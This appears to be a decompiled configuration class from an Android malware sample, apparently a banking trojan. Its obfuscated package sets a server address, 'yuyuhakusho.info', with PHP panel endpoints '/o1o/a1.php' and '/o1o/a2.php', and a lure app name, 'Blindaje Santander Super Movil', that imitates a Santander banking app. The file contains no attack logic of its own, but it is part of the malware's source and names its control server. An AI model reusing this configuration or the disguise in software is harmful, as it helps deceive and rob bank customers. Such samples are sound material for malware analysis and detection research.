package wocwvy.czyxoxmbauu.slsa;

/* renamed from: wocwvy.czyxoxmbauu.slsa.c */
public class C0039c {

    /* renamed from: a */
    public final String f374a = "http://yuyuhakusho.info";

    /* renamed from: b */
    public final String f375b = "";

    /* renamed from: c */
    public final String f376c = "/o1o/a1.php";

    /* renamed from: d */
    public final String f377d = "http://yuyuhakusho.info";

    /* renamed from: e */
    public final String f378e = "/o1o/a2.php";

    /* renamed from: f */
    public final boolean f379f = false;

    /* renamed from: g */
    public final boolean f380g = false;

    /* renamed from: h */
    public final String f381h = "ericcartman";

    /* renamed from: i */
    public final String f382i = "nhb";

    /* renamed from: j */
    public final String f383j = "nhb";

    /* renamed from: k */
    public final String f384k = "Blindaje Santander Super Movil";

    /* renamed from: l */
    public final int f385l = 10000;

    /* renamed from: m */
    public final String f386m = "";

    /* renamed from: n */
    public final int f387n = 12000;

    /* renamed from: o */
    public boolean f388o = false;

    /* renamed from: p */
    public String f389p = "<urlImage>";

    /* renamed from: q */
    public boolean f390q = false;

    /* renamed from: r */
    public int f391r = 300;

    /* renamed from: s */
    public int f392s = 0;

    /* renamed from: t */
    public int f393t = 1;
}
